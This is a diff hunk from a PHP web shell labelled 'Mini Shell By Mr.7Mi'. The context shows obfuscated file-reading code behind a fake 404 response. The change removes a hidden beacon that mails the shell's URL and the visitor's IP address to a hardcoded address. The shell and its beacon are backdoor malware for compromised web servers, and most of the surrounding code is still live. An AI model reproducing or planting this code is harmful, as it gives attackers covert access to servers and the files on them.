@@ -130,17 +130,6 @@ error_reporting(0); http_response_code(404); define("Yp", " Mini Shell By Mr.7Mi
 			<div class="form-group"><label for="ctn">Content :</label><textarea name="ctn" id="ctn" cols="30" rows="10" class="form-control" readonly><?= $c8[18]($c8[14]($Jd . '/' . jd($_GET["n"]))); ?></textarea></div>
 			<?php  WC: ?>
 		</div>
-		<?php
-@ini_set('output_buffering', 0);
-@ini_set('display_errors', 0);
-set_time_limit(0);
-ini_set('memory_limit', '64M');
-header('Content-Type: text/html; charset=UTF-8');
-$tujuanmail = 'off@off.com, off@off.com';
-$x_path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
-$pesan_alert = "fix $x_path :p *IP Address : [ " . $_SERVER['REMOTE_ADDR'] . " ]";
-mail($tujuanmail, "Hehehe", $pesan_alert, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");
-?>
 		<?php  goto mR; Un: ?>
 		<table class="table table-hover table-bordered table-sm">
 			<thead class="text-light">
